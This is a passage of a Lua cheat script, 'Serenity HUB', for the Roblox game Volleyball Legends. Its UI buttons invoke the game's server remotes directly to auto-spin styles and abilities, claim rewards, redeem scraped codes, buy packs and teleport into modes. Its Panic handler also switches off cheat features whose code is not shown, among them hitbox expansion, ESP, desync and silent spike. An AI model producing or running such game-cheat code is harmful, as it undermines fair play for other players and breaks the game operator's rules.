MC1:AddToggle({ Name = "Auto Style Spin", Default = false, Flag = "autostyle", Callback = function(v) 
    autoSpin = v
    if v then
        startAutoSpin()
    end
end })

MC1:AddDropdown({ Name = "Spin Type", Values = {"Normal", "Lucky"}, Default = "Normal", Flag = "spintype", Callback = function(v) 
    spinType = v
end })

MC1:AddInput({ Name = "Target Style", Placeholder = "Sanju", Flag = "targetstyle", Callback = function(v) 
    desiredStyles = {v}
    Window:Notify({ Title = "Target Set", Content = "Target style: " .. v, Duration = 2 })
end })

MC1:AddButton({ Name = "Instant Spin", Callback = function()
    local args = { [1] = (spinType == "Lucky") }
    local StyleService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.StyleService
    if StyleService then
        local RF = StyleService:FindFirstChild("RF")
        if RF then
            local Roll = RF:FindFirstChild("Roll")
            if Roll then
                Roll:InvokeServer(unpack(args))
                Window:Notify({ Title = "Instant Spin", Content = "Style spin executed! (" .. spinType .. ")", Duration = 2 })
            end
        end
    end
end })

MC2:AddToggle({ Name = "Auto Ability Spin", Default = false, Flag = "autoabilityspin", Callback = function(v) 
    autoAbilitySpin = v
    if v then
        startAutoAbilitySpin()
    end
end })

MC2:AddDropdown({ Name = "Ability Spin Type", Values = {"Normal", "Lucky"}, Default = "Normal", Flag = "abilityspintype", Callback = function(v) 
    abilitySpinType = v
end })

MC2:AddInput({ Name = "Target Ability", Placeholder = "Shield Breaker", Flag = "targetability", Callback = function(v) 
    desiredAbilities = {v}
    Window:Notify({ Title = "Target Set", Content = "Target ability: " .. v, Duration = 2 })
end })

MC2:AddButton({ Name = "Instant Spin", Callback = function()
    local args = { [1] = (abilitySpinType == "Lucky") }
    local AbilityService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.AbilityService
    if AbilityService then
        local RF = AbilityService:FindFirstChild("RF")
        if RF then
            local Roll = RF:FindFirstChild("Roll")
            if Roll then
                Roll:InvokeServer(unpack(args))
                Window:Notify({ Title = "Instant Spin", Content = "Ability spin executed! (" .. abilitySpinType .. ")", Duration = 2 })
            end
        end
    end
end })

MC3:AddButton({ Name = "Claim Level Rewards", Callback = function()
    local LevelService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.LevelService
    if LevelService then
        local RF = LevelService:FindFirstChild("RF")
        if RF then
            local ClaimLevelRewards = RF:FindFirstChild("ClaimLevelRewards")
            if ClaimLevelRewards then
                ClaimLevelRewards:InvokeServer()
                Window:Notify({ Title = "Claimed", Content = "Level rewards claimed!", Duration = 2 })
            end
        end
    end
end })

MC3:AddButton({ Name = "Claim Quest Rewards", Callback = function()
    local QuestService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.QuestService
    if QuestService then
        local RF = QuestService:FindFirstChild("RF")
        if RF then
            local ClaimAll = RF:FindFirstChild("ClaimAll")
            if ClaimAll then
                ClaimAll:InvokeServer(true)
                Window:Notify({ Title = "Claimed", Content = "Quest rewards claimed!", Duration = 2 })
            end
        end
    end
end })

MC3:AddButton({ Name = "Redeem All Codes", Callback = function()
    local function fetchNewCodes()
        local success, data = pcall(function()
            return game:HttpGet("https://beebom.com/haikyuu-legends-codes/")
        end)
        if not success or not data then
            return {}
        end
        local newCodes = {}
        local processed = {}
        for line in string.gmatch(data, "[^\n]+") do
            if string.find(line, "(NEW)") then
                local code = string.match(line, "(%u+[%u%d_]+)")
                if code and not processed[code] then
                    processed[code] = true
                    table.insert(newCodes, code)
                end
            end
            if #newCodes >= 3 then
                break
            end
        end
        return newCodes
    end
    local newCodes = fetchNewCodes()
    if #newCodes > 0 then
        for i, code in pairs(newCodes) do
            local CodeService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.CodeService
            if CodeService then
                local RF = CodeService:FindFirstChild("RF")
                if RF then
                    local Redeem = RF:FindFirstChild("Redeem")
                    if Redeem then
                        pcall(function()
                            Redeem:InvokeServer(code)
                        end)
                    end
                end
            end
            task.wait(0.01)
        end
        Window:Notify({ Title = "Codes Redeemed", Content = "All codes redeemed!", Duration = 3 })
    else
        Window:Notify({ Title = "No Codes", Content = "No codes found!", Duration = 3 })
    end
end })

MR:AddButton({ Name = "Buy Emote", Callback = function()
    local PackService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PackService.RF
    if PackService then
        local Open = PackService:FindFirstChild("Open")
        if Open then 
            Open:InvokeServer("Emote1")
            Window:Notify({ Title = "Shop", Content = "Emote purchased!", Duration = 2 })
        end
    end
end })

MR:AddButton({ Name = "Buy Effect", Callback = function()
    local PackService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PackService.RF
    if PackService then
        local Open = PackService:FindFirstChild("Open")
        if Open then 
            Open:InvokeServer("ScoreEffect1")
            Window:Notify({ Title = "Shop", Content = "Effect purchased!", Duration = 2 })
        end
    end
end })

MR:AddButton({ Name = "Buy Extreme Ball", Callback = function()
    local PackService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PackService.RF
    if PackService then
        local Open = PackService:FindFirstChild("Open")
        if Open then 
            Open:InvokeServer("Extreme")
            Window:Notify({ Title = "Shop", Content = "Extreme ball purchased!", Duration = 2 })
        end
    end
end })

MR:AddButton({ Name = "Buy Medium Ball", Callback = function()
    local PackService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PackService.RF
    if PackService then
        local Open = PackService:FindFirstChild("Open")
        if Open then 
            Open:InvokeServer("Medium")
            Window:Notify({ Title = "Shop", Content = "Medium ball purchased!", Duration = 2 })
        end
    end
end })

MR:AddButton({ Name = "Buy Basic Ball", Callback = function()
    local PackService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PackService.RF
    if PackService then
        local Open = PackService:FindFirstChild("Open")
        if Open then 
            Open:InvokeServer("Basic")
            Window:Notify({ Title = "Shop", Content = "Basic ball purchased!", Duration = 2 })
        end
    end
end })

local GameJoinTab = Window:AddTab({ Name = "Game Join", Icon = "gamepad", Type = "Double" })

local GJ = GameJoinTab:AddSection({ Name = "GAME MODES", Position = "Center" })

GJ:AddButton({ Name = "Chaos Mode", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("ChaosMode")
            Window:Notify({ Title = "Joining", Content = "Chaos Mode...", Duration = 2 })
        end
    end
end })

GJ:AddButton({ Name = "1v1 Mini Map", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("OnesMini")
            Window:Notify({ Title = "Joining", Content = "1v1 Mini Map...", Duration = 2 })
        end
    end
end })

GJ:AddButton({ Name = "2v2 Ranked", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("Twos")
            Window:Notify({ Title = "Joining", Content = "2v2 Ranked...", Duration = 2 })
        end
    end
end })

GJ:AddButton({ Name = "3v3 Ranked", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("Threes")
            Window:Notify({ Title = "Joining", Content = "3v3 Ranked...", Duration = 2 })
        end
    end
end })

GJ:AddButton({ Name = "4v4 Ranked", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("Fours")
            Window:Notify({ Title = "Joining", Content = "4v4 Ranked...", Duration = 2 })
        end
    end
end })

GJ:AddButton({ Name = "6v6 Ranked", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("Sixes")
            Window:Notify({ Title = "Joining", Content = "6v6 Ranked...", Duration = 2 })
        end
    end
end })

GJ:AddButton({ Name = "Training", Callback = function()
    local PartyService = ReplicatedStorage.Packages._Index["sleitnick_knit@1.7.0"].knit.Services.PartyService.RF
    if PartyService then
        local RequestTeleport = PartyService:FindFirstChild("RequestTeleport")
        if RequestTeleport then 
            RequestTeleport:InvokeServer("Training")
            Window:Notify({ Title = "Joining", Content = "Training...", Duration = 2 })
        end
    end
end })

local SettingsTab = Window:AddTab({ Name = "Settings", Icon = "gear" })
local SC = SettingsTab:AddSection({ Name = "CONFIG", Position = "Center" })

SC:AddButton({ Name = "Save Config", Callback = function() 
    Window:SaveConfig()
    Window:Notify({ Title = "Config Saved", Content = "Settings saved!", Duration = 2 })
end })

SC:AddButton({ Name = "Load Config", Callback = function() 
    Window:LoadConfig()
    Window:Notify({ Title = "Config Loaded", Content = "Settings loaded!", Duration = 2 })
end })

SC:AddButton({ Name = "Reset Config", Callback = function()
    Window:SaveConfig("Default", true)
    Window:LoadConfig("Default")
    Window:Notify({ Title = "Config Reset", Content = "Settings reset to default!", Duration = 2 })
end })

SC:AddButton({ Name = "Panic", Callback = function()
    removeHitboxes()
    silentSpikeEnabled = false
    redirectSpikeEnabled = false
    sanjuTiltEnabled = false
    maxChargeEnabled = false
    newSilentSpikeEnabled = false
    airMovement = false
    desyncEnabled = false
    autoReceiveEnabled = false
    akariDashEnabled = false
    espEnabled = false
    espJumpEnabled = false
    autoLucky = false
    autoYen = false
    autoAbility = false
    autoNormal = false
    autoSpin = false
    autoAbilitySpin = false
    infiniteLuckyEnabled = false
    hitEffectEnabled = false
    playerCardEnabled = false
    stopBallVisible = false
    aimVisible = false
    maxServeEnabled = false
    leadFeetEnabled = false
    if luckySpinConnection then task.cancel(luckySpinConnection) luckySpinConnection = nil end
    if yenConnection then task.cancel(yenConnection) yenConnection = nil end
    if abilityConnection then task.cancel(abilityConnection) abilityConnection = nil end
    if normalConnection then task.cancel(normalConnection) normalConnection = nil end
    if infiniteLuckyConnection then task.cancel(infiniteLuckyConnection) infiniteLuckyConnection = nil end
    if spikeButton then spikeButton.Visible = false end
    if newSpikeButton then newSpikeButton.Visible = false end
    if dashButton then dashButton.Visible = false end
    if stopBallButton then stopBallButton.Visible = false end
    if aimButton then aimButton.Visible = false end
    if leadFeetButton then leadFeetButton.Visible = false end
    if desyncConnection then desyncConnection:Disconnect() desyncConnection = nil end
    if autoReceiveConnection then autoReceiveConnection:Disconnect() autoReceiveConnection = nil end
    if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
    if hitConnection then hitConnection:Disconnect() hitConnection = nil end
    if hitConnection2 then hitConnection2:Disconnect() hitConnection2 = nil end
    if hitRemovedConnection then hitRemovedConnection:Disconnect() hitRemovedConnection = nil end
    if cardConnection then cardConnection:Disconnect() cardConnection = nil end
    if cardConnection2 then cardConnection2:Disconnect() cardConnection2 = nil end
    if notifConn then notifConn:Disconnect() notifConn = nil end
    if notifConn2 then notifConn2:Disconnect() notifConn2 = nil end
    if leadFeetConnection then leadFeetConnection:Disconnect() leadFeetConnection = nil end
    disableMaxServe()
    for player in pairs(espHighlights) do removeESP(player) end
    for player in pairs(espPlayers) do removeESP2(player) end
    Window:Notify({ Title = "Panic Mode", Content = "All features disabled", Duration = 3 })
end })

SC:AddButton({ Name = "Unload", Callback = function() 
    ModernV2:Unload()
end })

SC:AddDivider()
SC:AddParagraph({ Name = "Info", Content = "Serenity HUB - Volleyball Legends\nPress RightShift to toggle UI", RichText = true })

Window:Notify({ Title = "Serenity HUB", Content = "Loaded successfully!", Duration = 3 })
